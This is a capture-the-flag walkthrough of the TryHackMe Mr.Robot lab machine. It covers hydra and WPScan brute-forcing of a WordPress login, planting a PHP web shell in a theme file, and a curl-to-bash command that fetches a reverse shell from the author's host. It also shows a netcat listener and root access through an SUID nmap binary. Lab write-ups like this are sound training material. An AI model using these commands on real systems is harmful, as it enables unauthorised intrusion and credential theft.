Mr.Robot CTF - TryHackMe

By: InternetFreedomFighter

IP: 10.10.143.178

Date: June 19th, 2023

# NMAP

```bash
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 61
80/tcp  open   http     syn-ack ttl 61 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c163b1987c342ad6634c1c9d0aafb97
| SHA-1: ef0c5fa5931a09a5687ca2c280c4c79207cef71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
````

# Directory Enumeration

Command used:
```bash
feroxbuster -u http://10.10.143.178 -w /opt/raft-small-words.txt -x php,html,txt -r
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.143.178
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ str0nklol
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET      137l      464w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        6w       42c http://10.10.143.178/xmlrpc
200      GET        1l      155w     8640c http://10.10.143.178/css/A.main-600a9791.css.pagespeed.cf.Y5Y_QP-osV.css
200      GET       30l       98w     1188c http://10.10.143.178/index.html
200      GET        1l      155w     8596c http://10.10.143.178/admin/css/main-600a9791.css
200      GET       30l       98w     1104c http://10.10.143.178/admin/index.html
200      GET       61l      849w    50555c http://10.10.143.178/js/s_code.js.pagespeed.jm.I78cfHQpbQ.js
200      GET      636l     2179w    55357c http://10.10.143.178/admin/js/s_code.js
405      GET        1l        6w       42c http://10.10.143.178/xmlrpc.php
200      GET        0l        0w        0c http://10.10.143.178/wp-content/
200      GET        1l     2254w   182004c http://10.10.143.178/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js
200      GET       30l       98w     1188c http://10.10.143.178/
404      GET      137l      464w     8286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      820l     6033w   239300c http://10.10.143.178/js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js
200      GET        6l     2259w   182009c http://10.10.143.178/admin/js/vendor/vendor-48ca455c.js
200      GET        1l      248w     6048c http://10.10.143.178/wp-includes/css/buttons.min.css
200      GET       21l       31w      809c http://10.10.143.178/feed/
200      GET        1l      688w    24200c http://10.10.143.178/wp-admin/css/login.min.css
200      GET        1l       10w    46120c http://10.10.143.178/wp-includes/css/dashicons.min.css
200      GET        1l      248w     6048c http://10.10.143.178/wp-includes/css/buttons.min.css,qver=4.3.1.pagespeed.ce.ZQERzcrubG.css
200      GET    10295l    53814w   495992c http://10.10.143.178/admin/js/main-acba06a5.js
200      GET       30l       98w     1077c http://10.10.143.178/admin/
200      GET       53l      158w     2671c http://10.10.143.178/wp-login.php
200      GET        1l       10w    46120c http://10.10.143.178/wp-includes/css/dashicons.min.css,qver=4.3.1.pagespeed.ce.5l-W1PUiez.css
200      GET       53l      158w     2671c http://10.10.143.178/wp-login.php?redirect_to=http%3A%2F%2F10.10.143.178%2Fwp-admin%2F&reauth=1
500      GET        0l        0w        0c http://10.10.143.178/wp-includes/media
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/cache
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/feed
200      GET        1l      155w     8646c http://10.10.143.178/admin/css/A.main-600a9791.css.pagespeed.cf.8bAlrB4Frj.css
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/user
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/cron
200      GET       61l      849w    50555c http://10.10.143.178/admin/js/s_code.js.pagespeed.jm.I78cfHQpbQ.js
200      GET        1l     2254w   182004c http://10.10.143.178/admin/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/category
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/comment
500      GET        0l        0w        0c http://10.10.143.178/wp-includes/media.php
200      GET       53l      158w     2671c http://10.10.143.178/wp-login
404      GET        7l       24w      300c http://10.10.143.178/image/wp-content/themes/twentyfifteen/genericons/A.genericons.css,qver=3.2.pagespeed.cf.NPz-yIFsxm.css
500      GET        0l        0w        0c http://10.10.143.178/wp-includes/rss
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/feed.php
200      GET        0l        0w        0c http://10.10.143.178/wp-includes/user.php
404      GET        0l        0w        0c http://10.10.143.178/image/wp-content/uploads/2015/11/image.jpg
404      GET        0l        0w        0c http://10.10.143.178/image/wp-includes/
200      GET      154l      562w    11700c http://10.10.143.178/image/
200      GET        0l        0w        0c http://10.10.143.178/sitemap
[>-------------------] - 8m     41512/2064756 7h      found:43      errors:40584  
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_143_178-1687233640.state ...
[>-------------------] - 8m     41513/2064756 7h      found:43      errors:40584  
[#>------------------] - 8m     14012/172040  28/s    http://10.10.143.178/ 
[#>------------------] - 8m     13708/172040  28/s    http://10.10.143.178/images/ 
[#>------------------] - 8m     13804/172040  28/s    http://10.10.143.178/wp-includes/ 
[#>------------------] - 8m     13852/172040  28/s    http://10.10.143.178/js/ 
[#>------------------] - 8m     13724/172040  28/s    http://10.10.143.178/css/ 
[#>------------------] - 8m     13728/172040  28/s    http://10.10.143.178/admin/ 
[#>------------------] - 8m     13620/172040  28/s    http://10.10.143.178/wp-content/ 
[#>------------------] - 8m     13344/172040  27/s    http://10.10.143.178/feed/ 
[#>------------------] - 8m     13192/172040  27/s    http://10.10.143.178/blog/ 
[#>------------------] - 8m     13188/172040  27/s    http://10.10.143.178/wp-includes/images/ 
[#>------------------] - 8m     13168/172040  27/s    http://10.10.143.178/wp-includes/js/ 
[#>------------------] - 8m     12780/172040  26/s    http://10.10.143.178/image/
````

Theres certainly a lot to look at here. Had to stop the scan early because I noticed WordPress stuff and WPScan kept timing out.

# Robots.txt

I'm not sure why NMAP didn't find robots.txt, luckily I decided to check for it manually.

```html
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Interesting things here :DDD

# http://10.10.143.178/key-1-of-3.txt

```txt
073403c8a58aREDACTED
```

Found the first flag! :DDD

# fsocity.dic

Appears to be a huge (80,000+) list of things that look like they *could* be usernames and/or passwords.

# Bruteforcing usernames

On the wp-login.php page when you enter a username and password it will tell you whether a username exists or not when you submit. If you have a correct username it will tell you the password is wrong. I'm going to use the list 'fsocity.dic' to try to bruteforce usernames.

Command used:
```bash
hydra -V -L fsocity.dic -p testpass 10.10.143.178 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+in:Invalid username'
````
I let it run for about 1000 tests and recieved 1 result.

```bash
[80][http-post-form] host: 10.10.143.178   login: Elliot   password: testpass
````

We now have 1 valid username! :DDD

# Bruteforcing Elliots password

```bash
+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                                                                         
Trying Elliot / erased Time: 00:05:42 <============================                                                              > (5630 / 17081) 32.96%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```
WPScan was able to bruteforce the password! :DDD

# WPScan

Command used:

```bash
wpscan --url http://10.10.143.178/ -v --api-token 'REDACTED_API_TOKEN' --detection-mode aggressive --interesting-findings-detection aggressive -e --plugins-detection aggressive
````

Theres so much to look at here(1000's of lines), I dont want to include it here. I will save it to a seperate log file and include it in the repo.

# Initial Access

I looked around at all the vulnerabilities that WPScan spit out, there were a few interesting ones but I decided to try 'ole reliable.
On the left side of the dashboard under 'Appearance' there is a link named 'Editor' this will bring up a list of files in the theme that you can edit. I selected 'footer.php' deleted all of its content and replaced it with a PHP reverse shell one liner.

```php
<?php system($_REQUEST['cmd']); ?>
```

You can either navigate to the page and throw commands at it 'http://10.10.143.178/wp-content/themes/twentyfifteen/footer.php?cmd=ls+-lah' or you can cURL it, both work just fine.

Getting a shell:

```bash
curl -i 'http://10.10.143.178/wp-content/themes/twentyfifteen/footer.php?cmd=curl+http://10.6.16.164:1337/rev.sh|bash'
````

```bash
python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.143.178 - - [20/Jun/2023 01:31:26] "GET /rev.sh HTTP/1.1" 200 -
````

```bash
nc -lvnp 42069             
listening on [any] 42069 ...
connect to [10.6.16.164] from (UNKNOWN) [10.10.143.178] 44473
bash: cannot set terminal process group (1760): Inappropriate ioctl for device
bash: no job control in this shell
</wordpress/htdocs/wp-content/themes/twentyfifteen$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
````
Upgrading the shell:

```bash
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ntent/themes$ python3 -c 'import pty;pty.spawn("/bin/bash")'                
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ ^Z
zsh: suspended  nc -lvnp 42069
                                                                                                                                                                       
REDACTED:~/ctf-challenges/tryhackme/medium/mr-robot$ stty raw -echo; fg; reset
[1]  + continued  nc -lvnp 42069

<pps/wordpress/htdocs/wp-content/themes$ export TERM=xterm                   
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ stty rows 39
167mon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ stty columns
````

:DDD

# linPEAS output

```bash
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                    
                               ╚═══════════════════╝                                                                                                                   
OS: Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
User & Groups: uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
```
Old kernel, likely vulnerable. Ill save that as a last resort.

```bash
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                     
                ╚════════════════════════════════════════════════╝                                                                                                     
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                            
root         1  0.0  0.1  33248  1964 ?        Ss   03:44   0:01 /sbin/init                                                                                            
root       318  0.0  0.0  19472   312 ?        S    03:44   0:00 upstart-udev-bridge --daemon[0m
root       327  0.0  0.0  49788   740 ?        Ss   03:44   0:00 /lib/systemd/systemd-udevd --daemon
root       380  0.0  0.0  15272   124 ?        S    03:44   0:00 upstart-file-bridge --daemon[0m
syslog     418  0.0  0.0 260072   816 ?        Ssl  03:44   0:00 rsyslogd
root       742  0.0  0.0  15256   332 ?        S    03:44   0:00 upstart-socket-bridge --daemon[0m
root       958  0.0  0.0  10220   820 ?        Ss   03:44   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1014  0.0  0.0  23536   392 ?        Ss   03:44   0:00 /usr/sbin/vsftpd
root      1057  0.0  0.0  14536   724 tty4     Ss+  03:45   0:00 /sbin/getty -8 38400 tty4
root      1060  0.0  0.0  14536   724 tty5     Ss+  03:45   0:00 /sbin/getty -8 38400 tty5
root      1063  0.0  0.0  14536   724 tty2     Ss+  03:45   0:00 /sbin/getty -8 38400 tty2
root      1064  0.0  0.0  14536   724 tty3     Ss+  03:45   0:00 /sbin/getty -8 38400 tty3
root      1066  0.0  0.0  14536   724 tty6     Ss+  03:45   0:00 /sbin/getty -8 38400 tty6
root      1078  0.0  0.0  23652   740 ?        Ss   03:45   0:00 cron
root      1441  0.0  0.0   4440   584 ?        S    03:45   0:00 /bin/sh /opt/bitnami/mysql/bin/mysqld_safe --defaults-file=/opt/bitnami/mysql/my.cnf --port=3306 --socket=/opt/bitnami/mysql/tmp/mysql.sock --datadir=/opt/bitnami/mysql/data --log-error=/opt/bitnami/mysql/data/mysqld.log --pid-file=/opt/bitnami/mysql/data/mysqld.pid --lower-case-table-names=1
mysql     1716  3.3 33.4 1315084 339768 ?      Sl   03:45   3:48  _ /opt/bitnami/mysql/bin/mysqld.bin --defaults-file=/opt/bitnami/mysql/my.cnf --basedir=/opt/bitnami/mysql --datadir=/opt/bitnami/mysql/data --plugin-dir=/opt/bitnami/mysql/lib/plugin --user=mysql --lower-case-table-names=1 --log-error=/opt/bitnami/mysql/data/mysqld.log --pid-file=/opt/bitnami/mysql/data/mysqld.pid --socket=/opt/bitnami/mysql/tmp/mysql.sock --port=3306
root      1760  0.0  0.6 258616  6108 ?        Ss   03:45   0:00 php-fpm: master process (/opt/bitnami/php/etc/php-fpm.conf)
daemon[0m    2685  0.2  2.8 263232 28616 ?        S    05:14   0:02  _ php-fpm: pool wordpress
daemon[0m    2719  0.0  0.0   4440   644 ?        S    05:31   0:00  |   _ sh -c curl http://10.6.16.164:1337/rev.sh|bash
daemon[0m    2721  0.0  0.1  17960  1420 ?        S    05:31   0:00  |       _ bash
daemon[0m    2724  0.0  0.0   4360   360 ?        S    05:31   0:00  |           _ cat /tmp/f
daemon[0m    2725  0.0  0.1  18140  1948 ?        S    05:31   0:00  |           _ bash -i
daemon[0m    2733  0.0  0.5  35268  5796 ?        S    05:33   0:00  |           |   _ python3 -c import pty;pty.spawn("/bin/bash")
daemon[0m    2734  0.0  0.1  18164  2020 pts/0    Ss   05:33   0:00  |           |       _ /bin/bash
daemon[0m    2745  0.7  0.3  20260  3836 pts/0    S+   05:37   0:00  |           |           _ bash linpeas.sh
daemon[0m    7335  0.0  0.2  20260  2796 pts/0    S+   05:37   0:00  |           |               _ bash linpeas.sh
daemon[0m    7339  0.0  0.1  15716  1216 pts/0    R+   05:37   0:00  |           |               |   _ ps fauxwww
daemon[0m    7338  0.0  0.2  20260  2580 pts/0    S+   05:37   0:00  |           |               _ bash linpeas.sh
daemon[0m    2726  0.0  0.0  11220   748 ?        S    05:31   0:00  |           _ nc 10.6.16.164 42069
daemon[0m    2686  0.1  2.8 264532 28808 ?        S    05:14   0:02  _ php-fpm: pool wordpress
daemon[0m    2687  0.0  2.7 264124 28392 ?        S    05:15   0:00  _ php-fpm: pool wordpress
root      1767  0.0  2.2 207948 22532 ?        Ss   03:45   0:06 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    1996  0.3  3.0 995072 30956 ?        Sl   03:52   0:20  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2028  0.1  3.1 986884 32320 ?        Sl   03:52   0:10  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2089  0.1  2.9 986764 29548 ?        Sl   03:52   0:10  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2118  0.1  2.7 986500 28408 ?        Sl   03:52   0:08  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2176  0.1  2.9 986656 29524 ?        Sl   03:52   0:09  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2178  0.1  2.9 986848 29944 ?        Sl   03:52   0:09  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2179  0.2  3.2 995072 33084 ?        Sl   03:52   0:13  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2432  0.1  2.2 978620 22512 ?        Sl   04:28   0:04  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2461  0.0  2.2 986696 22544 ?        Sl   04:28   0:04  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon[0m    2519  0.1  2.3 986696 23540 ?        Sl   04:28   0:04  _ /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
root      1915  0.1  0.1 104328  1344 ?        Sl   03:45   0:08 /usr/bin/monit -c /etc/monit/monitrc
root      1941  0.0  0.0  14536   868 tty1     Ss+  03:45   0:00 /sbin/getty -8 38400 tty1
```

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                          
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -                                                                                      
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

Theres 3 ports listening locally. 21, 2812, 3306

```bash
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-x--- 1 bitnamiftp daemon 3756 Nov 14  2015 /opt/bitnami/apps/wordpress/htdocs/wp-config.php                                                                      
define('DB_NAME', 'bitnami_wordpress');
define('DB_USER', 'bn_wordpress');
define('DB_PASSWORD', 'REDACTED');
define('DB_HOST', 'localhost:3306');
define('WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/');
define('WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/');
define('FTP_USER', 'bitnamiftp');
define('FTP_HOST', '127.0.0.1');
```

Got some more creds! :DDD

```bash
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
```
/usr/local/bin/nmap is SUID

```bash
╔══════════╣ Files inside others home (limit 20)
/home/robot/password.raw-md5                                                                                                                                           
/home/robot/key-2-of-3.txt
```

Found the 2nd flag, its not readable by us. password.raw-md5 is readable by us though!

```bash
c3fcd3d761REDACTED	md5	REDACTED
```

https://crackstation.net has it logged already! :DDD

# Escalation to user "robot"

The password works! We are not logged in as 'robot'

```bash
daemon@linux:/home/robot$ su robot
Password: 
robot@linux:~$ cd
robot@linux:~$ ls -lah
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
robot@linux:~$ cat key-2-of-3.txt 
822c739561REDACTED
```

# Escalation to root

I was going to run linPEAS again and go through the output for more stuff, maybe check out those other ports on the machine, but I remembered that we found that SUID NMAP binary. A quick google search for 'nmap suid privilege escalation' found a super easy exploit to get root!

https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/

Great writeup about the vulnerability

```bash
robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
root
waiting to reap child : No child processes
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
# ls -lah
total 32K
drwx------  3 root root 4.0K Nov 13  2015 .
drwxr-xr-x 22 root root 4.0K Sep 16  2015 ..
-rw-------  1 root root 4.0K Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3.2K Sep 16  2015 .bashrc
drwx------  2 root root 4.0K Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1.0K Sep 16  2015 .rnd
# cat key       ^H
cat: key: No such file or directory
cat:: No such file or directory
# cat key-3-of-3.txt
04787ddef2REDACTED
```

This was a really fun machine that I've been meaning to root for quite some time now. I attempted this during the beginning of my pentesting/cybersecurity journey (around the beginning of 2021) and made almost no progress on it :P It felt good to be able to come back to it and pretty much fly through the machine.

Heres a link to the machine: https://tryhackme.com/room/mrrobot I highly recommend it!